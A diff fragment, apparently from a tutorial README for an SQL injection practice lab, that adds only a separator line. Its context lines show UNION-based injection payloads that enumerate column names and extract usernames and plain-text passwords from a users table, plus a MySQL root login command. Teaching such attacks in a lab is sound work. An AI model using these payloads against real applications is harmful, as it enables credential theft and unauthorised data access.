@@ -60,6 +60,9 @@ SELECT ?, ?, ? FROM products WHERE name LIKE '%steel%' UNION (SELECT COLUMN_NAME
 -- Grab usernames and passwords (stored in plain text)
 SELECT ?, ?, ? FROM products WHERE name LIKE '%steel%' UNION (SELECT id, username, password FROM users);  -- 
 ```
+
+------------------------------------------------------------------------------------------------------------------------
+
 If you get errors connecting to MySQL, run the following:
 `$ mysql -u root -p`
 ```SQL
